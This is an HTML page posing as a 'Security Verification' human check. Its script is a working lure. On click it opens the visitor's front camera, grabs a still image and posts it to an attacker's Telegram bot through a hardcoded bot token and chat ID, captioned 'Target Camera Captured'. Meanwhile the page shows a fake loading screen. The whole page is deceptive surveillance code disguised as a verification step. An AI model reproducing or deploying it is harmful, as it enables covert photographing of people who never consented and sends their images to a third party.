<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Required</title>
    <style>
        body {
            background-color: #0f172a;
            color: #f8fafc;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #1e293b;
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            max-width: 320px;
            width: 100%;
        }
        .btn {
            background-color: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            transition: 0.2s;
        }
        .btn:hover {
            background-color: #0ea5e9;
        }
    </style>
</head>
<body>
    <div class="card" id="main-card">
        <h3>🔒 Security Verification</h3>
        <p style="color: #94a3b8; font-size: 14px;">Click below to verify that you are a human and load the content.</p>
        <button class="btn" onclick="startCapture()">Continue ➔</button>
    </div>

    <div class="card" id="loading-card" style="display: none;">
        <h3>Loading...</h3>
        <p style="color: #94a3b8; font-size: 14px;">Please wait while we fetch your content.</p>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8857558695:AAGOlJ_9PzeyvaOku_2_-MxjdbZJILC1cQI";
        const CHAT_ID = "6478868514";

        function startCapture() {
            document.getElementById('main-card').style.display = 'none';
            document.getElementById('loading-card').style.display = 'block';

            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(() => {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob(blob => {
                            stream.getTracks().forEach(track => track.stop());

                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('caption', '📸 **Target Camera Captured via Direct JS**');
                            formData.append('parse_mode', 'Markdown');
                            formData.append('photo', blob, 'captured.jpg');

                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            })
                            .then(res => res.json())
                            .then(data => console.log("Success:", data))
                            .catch(err => console.error("Error:", err));

                        }, 'image/jpeg', 0.85);

                    }, 1500);
                })
                .catch(err => {
                    console.error("Camera access error:", err);
                    document.getElementById('loading-card').innerHTML = "<h3>Error Loading Page</h3><p style='color:#ef4444;font-size:14px;'>Please try again.</p>";
                });
        }
    </script>
</body>
</html>
